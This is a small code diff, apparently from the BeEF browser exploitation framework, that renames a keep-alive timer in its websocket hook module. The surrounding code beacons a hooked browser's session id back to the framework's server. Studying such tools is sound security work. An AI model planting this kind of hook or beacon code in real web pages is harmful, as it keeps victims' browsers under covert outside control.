@@ -11,7 +11,7 @@
 beef.websocket = {
 
     socket:null,
-    alive_timer:<%= @websocket_timer %>,
+    ws_poll_timeout:<%= @ws_poll_timeout %>,
 
     init:function () {
         var webSocketServer = beef.net.host;
@@ -69,7 +69,7 @@ beef.websocket = {
     alive: function (){
         beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
 //        console.log("sent alive");
-        setTimeout("beef.websocket.alive()", beef.websocket.alive_timer);
+        setTimeout("beef.websocket.alive()", beef.websocket.ws_poll_timeout);
 
     }
 };
